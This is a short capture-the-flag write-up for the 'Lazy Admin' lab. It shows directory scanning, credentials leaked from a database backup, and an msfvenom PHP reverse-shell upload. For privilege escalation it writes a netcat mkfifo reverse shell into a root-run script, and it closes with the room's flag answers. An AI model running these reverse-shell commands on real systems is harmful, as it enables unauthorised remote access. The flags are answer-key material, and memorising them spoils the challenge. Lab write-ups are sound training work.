# Lazy Admin

ip : `10.10.30.3`

dirb scanning reveals the directories content
```
dirb http://10.10.30.3
```
> we found a database backup in the link : `http://10.10.30.3/content/inc/db.php`

> we found a md5 hash string : `42f749ade7f9e195bf475f37a44cafcb`
from the database backup we found the credentials for login into the link `http://10.10.30.3/as/`
`uesrname`:`manager` and `password` : `Password123`


now creatign a php reverse shell payload then make a zip of that file and upload this as an attachment
```
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.17.48.110 LPORT=4444 > payload.php
```
now if we go to the following link we can see the attachment
```
http://10.10.30.3/content/attachment/
```

now just start the multi handler in msfconsole

write a netcat payload to the file which can be execute by super user
```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.17.48.110 4445 > /tmp/f " > /etc/copy.sh
```



| Questions | Answers |
|----------|----------|
| What is the user flag ? | THM{63e5bce9271952aad1113b6f1ac28a07} |
| What is the root flag ? | THM{6637f41d0177b6f37cb20d775124699f}

